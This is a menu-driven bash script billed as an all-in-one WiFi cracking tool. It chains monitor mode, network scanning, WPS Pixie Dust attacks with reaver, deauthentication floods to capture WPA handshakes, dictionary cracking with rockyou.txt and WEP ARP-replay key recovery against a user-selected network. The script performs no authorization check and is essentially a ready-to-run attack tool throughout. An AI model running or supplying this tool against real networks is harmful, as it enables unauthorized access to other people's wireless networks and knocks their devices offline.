#!/bin/bash

# Automated WiFi Cracking Script - All-in-One Solution
# Supports WEP, WPA/WPA2-PSK, WPS, PMKID attacks

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default wordlist
WORDLIST="/usr/share/wordlists/rockyou.txt"

print_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║              WiFi Hacking Framework v2.0                     ║
║          Automated Wireless Network Auditing                 ║
║                                                              ║
║  Supports: WEP | WPA/WPA2 | WPS | PMKID | Evil Twin         ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

print_header() {
    echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║  $1${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"
}

print_info() { echo -e "${GREEN}[+]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error() { echo -e "${RED}[-]${NC} $1"; }
print_success() { echo -e "${GREEN}[✓]${NC} $1"; }

check_root() {
    if [ "$EUID" -ne 0 ]; then
        print_error "This script must be run as root!"
        print_info "Run: sudo $0"
        exit 1
    fi
}

check_dependencies() {
    print_header "Checking Dependencies"
    
    local required=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng")
    local optional=("wash" "reaver" "bully" "hcxpcapngtool" "hashcat")
    local missing=()
    
    for tool in "${required[@]}"; do
        if command -v "$tool" &> /dev/null; then
            print_success "$tool found"
        else
            print_error "$tool NOT FOUND (required)"
            missing+=("$tool")
        fi
    done
    
    for tool in "${optional[@]}"; do
        if command -v "$tool" &> /dev/null; then
            print_success "$tool found"
        else
            print_warning "$tool not found (optional)"
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        print_error "Missing required tools: ${missing[*]}"
        print_info "Install with: sudo apt install aircrack-ng"
        exit 1
    fi
    
    # Check wordlist
    if [ ! -f "$WORDLIST" ]; then
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            print_info "Extracting rockyou.txt..."
            gunzip -k /usr/share/wordlists/rockyou.txt.gz
        else
            print_warning "rockyou.txt not found"
        fi
    fi
}

kill_processes() {
    print_header "Killing Interfering Processes"
    airmon-ng check kill &>/dev/null
    print_success "Interfering processes killed"
}

get_interface() {
    print_header "Available Network Interfaces"
    
    echo -e "${CYAN}Available interfaces:${NC}"
    iwconfig 2>&1 | grep -E "^[a-z]" | awk '{print "  - " $1}'
    echo ""
    
    read -p "Enter wireless interface name: " INTERFACE
    
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        print_error "Invalid interface: $INTERFACE"
        exit 1
    fi
    
    print_success "Using interface: $INTERFACE"
}

enable_monitor_mode() {
    print_header "Enabling Monitor Mode"
    
    print_info "Starting monitor mode on $INTERFACE..."
    airmon-ng start "$INTERFACE" &>/dev/null
    
    # Detect monitor interface
    MONITOR_INTERFACE=$(iwconfig 2>&1 | grep "Mode:Monitor" | awk '{print $1}')
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        print_error "Failed to enable monitor mode"
        exit 1
    fi
    
    print_success "Monitor mode enabled: $MONITOR_INTERFACE"
}

disable_monitor_mode() {
    if [ -n "$MONITOR_INTERFACE" ]; then
        print_info "Disabling monitor mode..."
        airmon-ng stop "$MONITOR_INTERFACE" &>/dev/null
        print_success "Monitor mode disabled"
    fi
}

scan_networks() {
    print_header "Scanning for WiFi Networks"
    
    local scan_file="/tmp/wifi_scan_$$"
    
    print_info "Scanning for 30 seconds..."
    print_warning "Press Ctrl+C when you see your target network"
    
    timeout 30 airodump-ng "$MONITOR_INTERFACE" -w "$scan_file" --output-format csv &>/dev/null || true
    
    if [ ! -f "${scan_file}-01.csv" ]; then
        print_error "Scan failed"
        return 1
    fi
    
    print_success "Scan complete!"
    echo ""
    
    # Parse and display networks
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    printf "${CYAN}║${NC} %-3s %-20s %-8s %-6s %-10s %-18s ${CYAN}║${NC}\n" "No" "ESSID" "Channel" "Power" "Encryption" "BSSID"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════════════════╣${NC}"
    
    local i=1
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        if [[ "$bssid" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]]; then
            essid=$(echo "$essid" | tr -d ' ')
            [ -z "$essid" ] && essid="<hidden>"
            
            printf "${CYAN}║${NC} %-3s %-20s %-8s %-6s %-10s %-18s ${CYAN}║${NC}\n" \
                "$i" "${essid:0:20}" "$channel" "$power" "${privacy:0:10}" "$bssid"
            
            NETWORKS[$i]="$bssid|$channel|$essid|$privacy"
            i=$((i + 1))
            
            [ $i -gt 20 ] && break
        fi
    done < <(tail -n +3 "${scan_file}-01.csv")
    
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    rm -f "${scan_file}"-* 2>/dev/null
}

select_target() {
    echo ""
    read -p "Select target number: " TARGET_NUM
    
    if [ -z "${NETWORKS[$TARGET_NUM]}" ]; then
        print_error "Invalid selection"
        exit 1
    fi
    
    IFS='|' read -r TARGET_BSSID TARGET_CHANNEL TARGET_ESSID TARGET_ENCRYPTION <<< "${NETWORKS[$TARGET_NUM]}"
    
    print_success "Target selected:"
    echo "  ESSID: $TARGET_ESSID"
    echo "  BSSID: $TARGET_BSSID"
    echo "  Channel: $TARGET_CHANNEL"
    echo "  Encryption: $TARGET_ENCRYPTION"
}

attack_wps() {
    print_header "WPS Attack"
    
    print_info "Checking if WPS is enabled..."
    timeout 30 wash -i "$MONITOR_INTERFACE" -C 2>&1 | tee /tmp/wps_scan.txt || true
    
    if ! grep -q "$TARGET_BSSID" /tmp/wps_scan.txt; then
        print_warning "WPS not detected on target"
        return 1
    fi
    
    print_success "WPS is enabled!"
    
    # Try Pixie Dust first
    print_info "Attempting Pixie Dust attack..."
    timeout 300 reaver -i "$MONITOR_INTERFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" -vv -K \
        2>&1 | tee /tmp/pixie_dust.log || true
    
    if grep -q "WPS PIN:" /tmp/pixie_dust.log; then
        print_success "WPS PIN FOUND!"
        grep -E "WPS PIN:|WPA PSK:" /tmp/pixie_dust.log
        return 0
    fi
    
    print_warning "Pixie Dust failed"
    return 1
}

capture_handshake() {
    print_header "Capturing WPA/WPA2 Handshake"
    
    local capture_file="/tmp/handshake_$$"
    
    print_info "Starting packet capture..."
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$capture_file" "$MONITOR_INTERFACE" &
    local AIRODUMP_PID=$!
    
    sleep 5
    
    local attempts=0
    local max_attempts=5
    
    while [ $attempts -lt $max_attempts ]; do
        attempts=$((attempts + 1))
        
        print_info "Attempt $attempts/$max_attempts: Deauthenticating clients..."
        timeout 20 aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MONITOR_INTERFACE" &>/dev/null || true
        
        sleep 15
        
        # Check for handshake
        if aircrack-ng "${capture_file}"-*.cap 2>&1 | grep -q "1 handshake"; then
            kill $AIRODUMP_PID 2>/dev/null || true
            print_success "Handshake captured!"
            echo "$capture_file"
            return 0
        fi
        
        print_warning "No handshake yet..."
    done
    
    kill $AIRODUMP_PID 2>/dev/null || true
    print_error "Failed to capture handshake"
    return 1
}

crack_handshake() {
    local capture_file="$1"
    
    print_header "Cracking WPA/WPA2 Password"
    
    if [ ! -f "$WORDLIST" ]; then
        print_error "Wordlist not found: $WORDLIST"
        read -p "Enter wordlist path: " WORDLIST
    fi
    
    print_info "Using wordlist: $WORDLIST"
    print_info "Starting dictionary attack..."
    print_warning "This may take a while..."
    
    aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "${capture_file}"-*.cap 2>&1 | tee /tmp/crack_result.txt
    
    if grep -q "KEY FOUND" /tmp/crack_result.txt; then
        print_success "PASSWORD FOUND!"
        grep "KEY FOUND" /tmp/crack_result.txt
        return 0
    else
        print_error "Password not found in wordlist"
        
        # Offer hashcat conversion
        if command -v hcxpcapngtool &> /dev/null; then
            print_info "Converting to hashcat format for GPU cracking..."
            hcxpcapngtool -o /tmp/handshake.22000 "${capture_file}"-*.cap 2>&1
            print_info "Hashcat file: /tmp/handshake.22000"
            print_info "Crack with: hashcat -m 22000 /tmp/handshake.22000 $WORDLIST"
        fi
        
        return 1
    fi
}

attack_wep() {
    print_header "WEP Attack"
    
    local capture_file="/tmp/wep_$$"
    
    print_info "Starting WEP packet capture..."
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$capture_file" "$MONITOR_INTERFACE" &
    local AIRODUMP_PID=$!
    
    sleep 5
    
    print_info "Attempting fake authentication..."
    aireplay-ng -1 0 -a "$TARGET_BSSID" "$MONITOR_INTERFACE" &>/dev/null || true
    
    print_info "Starting ARP replay attack..."
    print_warning "This may take several minutes..."
    
    timeout 600 aireplay-ng -3 -b "$TARGET_BSSID" "$MONITOR_INTERFACE" &>/dev/null || true
    
    sleep 10
    kill $AIRODUMP_PID 2>/dev/null || true
    
    print_info "Attempting to crack WEP key..."
    aircrack-ng "${capture_file}"-*.cap 2>&1 | tee /tmp/wep_crack.txt
    
    if grep -q "KEY FOUND" /tmp/wep_crack.txt; then
        print_success "WEP KEY FOUND!"
        grep "KEY FOUND" /tmp/wep_crack.txt
        return 0
    else
        print_error "Not enough IVs captured"
        return 1
    fi
}

main_menu() {
    print_banner
    
    echo -e "${CYAN}Select attack mode:${NC}"
    echo ""
    echo "  1) Automated attack (try all methods)"
    echo "  2) WPS attack only"
    echo "  3) WPA/WPA2 handshake capture + crack"
    echo "  4) WEP attack"
    echo "  5) Scan networks only"
    echo "  6) Exit"
    echo ""
    read -p "Choice: " choice
    
    case $choice in
        1) MODE="auto" ;;
        2) MODE="wps" ;;
        3) MODE="wpa" ;;
        4) MODE="wep" ;;
        5) MODE="scan" ;;
        6) exit 0 ;;
        *) print_error "Invalid choice"; exit 1 ;;
    esac
}

cleanup() {
    print_info "Cleaning up..."
    disable_monitor_mode
    rm -f /tmp/wifi_scan_* /tmp/handshake_* /tmp/wep_* /tmp/*.log 2>/dev/null
}

main() {
    trap cleanup EXIT INT TERM
    
    check_root
    print_banner
    check_dependencies
    
    main_menu
    
    kill_processes
    get_interface
    enable_monitor_mode
    
    if [ "$MODE" == "scan" ]; then
        scan_networks
        exit 0
    fi
    
    declare -A NETWORKS
    scan_networks
    select_target
    
    case "$MODE" in
        auto)
            print_header "Automated Attack Mode"
            
            # Try WPS first (fastest)
            if attack_wps; then
                print_success "Attack successful via WPS!"
                exit 0
            fi
            
            # Try WPA/WPA2
            if [[ "$TARGET_ENCRYPTION" == *"WPA"* ]]; then
                local capture_file=$(capture_handshake)
                if [ -n "$capture_file" ]; then
                    if crack_handshake "$capture_file"; then
                        print_success "Attack successful via WPA crack!"
                        exit 0
                    fi
                fi
            fi
            
            # Try WEP
            if [[ "$TARGET_ENCRYPTION" == *"WEP"* ]]; then
                if attack_wep; then
                    print_success "Attack successful via WEP crack!"
                    exit 0
                fi
            fi
            
            print_error "All attack methods failed"
            ;;
            
        wps)
            attack_wps
            ;;
            
        wpa)
            local capture_file=$(capture_handshake)
            if [ -n "$capture_file" ]; then
                crack_handshake "$capture_file"
            fi
            ;;
            
        wep)
            attack_wep
            ;;
    esac
}

main "$@"
